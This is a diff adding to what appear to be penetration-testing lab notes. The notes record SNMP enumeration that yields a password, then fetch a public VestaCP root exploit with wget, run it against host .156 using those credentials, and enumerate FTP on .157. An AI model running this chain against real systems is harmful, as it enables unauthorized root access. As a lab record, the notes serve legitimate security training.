@@ -213,6 +213,29 @@ sudo nmap -sU --open -p 161 192.168.230.156
 snmp-check 192.168.230.156 -c public
 snmpwalk -c public -v1 -t 10 192.168.230.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
 # find password jack:3PUKsX98BMupBiCf
+```
 
+.156 privesc
+```
+# we can login to the vesta admin panel with the creds we found, there are a number of exploits against vesta CP
+# do some serious googling to find https://github.com/rekter0/exploits/blob/master/VestaCP/vestaROOT.py
+wget https://raw.githubusercontent.com/rekter0/exploits/master/VestaCP/VestaFuncs.py
+wget https://raw.githubusercontent.com/rekter0/exploits/master/VestaCP/vestaROOT.py
+
+python3 vestaROOT.py https://192.168.230.156:8083 Jack 3PUKsX98BMupBiCf
+```
+
+.157
+```
+nmap 192.168.230.157
+nmap -sT -A -p 21,22,80,20000 -Pn 192.168.230.157
+
+# enumerate ftp
+nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.230.157
+
+# login anonymous and download some files
+
+exiftool NEWSLETTER-TEMPLATE.pdf 
+# find users Mark, Robert, Cassie
 
 ```
